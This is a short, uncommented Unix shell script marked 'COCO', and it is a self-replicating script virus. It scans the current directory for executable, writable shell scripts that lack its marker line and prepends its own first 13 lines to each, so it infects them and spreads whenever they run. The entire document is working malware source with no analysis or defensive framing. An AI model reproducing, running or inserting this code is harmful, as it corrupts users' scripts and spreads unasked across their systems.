 # COCO ( 2 ? )
 for file in * ;  do
   if test -f $file && test -x $file && test -w $file ; then
    if grep -s echo $file > /dev/nul ; then
     head -n 1 $file >.mm
      if grep -s COCO .mm > /dev/nul ; then
       rm .mm -f ; else
        cat $file > .SAVEE
        head -n 13 $0 > $file
        cat .SAVEE >> $file
  fi; fi; fi
 done
 rm .SAVEE .mm -f
